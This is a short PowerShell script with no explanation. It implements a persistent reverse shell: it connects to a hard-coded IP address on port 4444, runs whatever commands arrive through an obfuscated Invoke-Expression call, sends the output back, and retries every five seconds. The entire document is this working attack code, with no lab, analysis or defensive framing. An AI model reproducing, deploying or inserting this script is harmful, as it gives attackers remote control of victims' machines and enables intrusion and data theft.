$h = 'System.Net.Sockets.TcpClient'
$a = 'System.Text.ASCIIEncoding'
$i = '134.209.113.62'
$p = 4444

while ($true) {
    try {
        $c = New-Object ($h) ($i, $p)
        $s = $c.GetStream()
        $e = New-Object ($a)
        $b = New-Object Byte[] 65536

        while (($r = $s.Read($b, 0, $b.Length)) -ne 0) {
            $d = $e.GetString($b, 0, $r)
            $t = &('ie' + 'x') $d 2>&1 | Out-String
            $t2 = $t + ('PS ' + (gp 'HKCU:\Console').WindowTitle + '> ')
            $m = $e.GetBytes($t2)
            $s.Write($m, 0, $m.Length)
            $s.Flush()
        }

        $c.Close()
    }
    catch {
        Start-Sleep -Seconds 5  # Wait before retrying
    }
}